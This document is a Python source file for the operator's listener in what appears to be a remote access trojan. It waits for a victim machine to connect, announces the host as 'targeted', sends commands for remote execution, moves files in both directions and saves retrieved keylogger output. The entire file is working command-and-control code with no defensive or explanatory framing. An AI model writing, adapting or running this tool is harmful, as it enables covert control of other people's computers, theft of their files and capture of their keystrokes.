import socket
import time
import json
import base64

#Listener Class
class Listener:
    
    #Initiating Listner for receiving incoming connections.
    
    def __init__(self,ip,port,ipv6):
        if ipv6:
            sp = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        else:
            sp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sp.bind((ip,port))
        sp.listen(1)
        print("[+] Waiting for the Incoming Connections...")
        self.connection, address = sp.accept()
        print("[+] Access Granted! ["+str(address)+"] has been targeted!")

    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_recv(self):
        data = "".encode()
        while True:
            try:
                data = data + self.connection.recv(4096)
                return json.loads(data)
            except:
                continue

    def read_file(self,path):
        with open(path,"rb") as f:
            return base64.b64encode(f.read()).decode()

    def write_file(self,path,content):
        if "log" in path:
             with open(path,"ab") as f:
                f.write(base64.decodebytes(content))
                return "[+] Downloaded KeyLogs Successfully"
        with open(path,"wb") as f:
            f.write(base64.decodebytes(content))
            return "[+] Download Successful"

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0].lower() == "exit":
            self.connection.close()
            exit()
        return self.reliable_recv()

    def run(self):
        while True:
            command = input(">> ")
            command = command.split()
            try:
                if command[0] == "upload":
                    content = self.read_file(command[1])
                    command.append(content)
                result = self.execute_remotely(command)
                if command[0] == "download" and "[-]" not in result:
                    result = self.write_file(" ".join(command[1:]),result.encode())
            except Exception as e:
                result = "[-] Error Processing\n" + str(e)

            print(result)
